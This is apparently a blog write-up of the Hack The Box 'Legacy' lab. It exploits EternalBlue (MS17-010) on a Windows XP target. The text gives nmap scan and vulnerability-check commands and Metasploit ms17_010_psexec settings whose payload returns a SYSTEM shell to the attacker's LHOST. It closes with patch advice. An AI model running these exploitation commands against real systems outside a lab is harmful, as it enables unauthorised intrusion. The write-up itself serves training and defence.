layout: post title: "HTB: Legacy Writeup" date: 2025-05-20 categories: Writeups tags: [Windows, Network, SMB, Easy] excerpt: "A classic beginner machine demonstrating the EternalBlue exploit (MS17-010) on Windows XP."

Mission Briefing

Target: Legacy (10.10.10.4)

OS: Windows XP

Difficulty: Easy

This lab focuses on identifying deprecated protocols and exploiting the infamous SMB vulnerability known as EternalBlue.

1. Reconnaissance

We begin with a standard Nmap scan to identify open ports and services.

nmap -sC -sV -oA nmap/legacy 10.10.10.4


Output Analysis:
The scan reveals port 445 (SMB) is open. The service version suggests Windows XP, which is highly susceptible to MS08-067 and MS17-010.

2. Enumeration

Using Nmap's scripting engine, we can verify vulnerability:

nmap --script smb-vuln-ms17-010 -p 445 10.10.10.4


The script confirms the target is vulnerable to MS17-010 (EternalBlue).

3. Exploitation

I utilized the Metasploit framework for the initial foothold, though manual python scripts (AutoBlue) are also viable.

use exploit/windows/smb/ms17_010_psexec
set RHOSTS 10.10.10.4
set LHOST tun0
run


4. Privilege Escalation

Since EternalBlue exploits the kernel directly via the SMB driver, the resulting shell is NT AUTHORITY\SYSTEM. No further escalation was required.

Root Flag: e19...f2a

Intelligence Gained

Legacy systems (Win XP/7) in a network are critical liabilities.

SMB signing was disabled, allowing easy exploitation.

Patch Recommendation: Apply security patch MS17-010 immediately or decommission the legacy host.
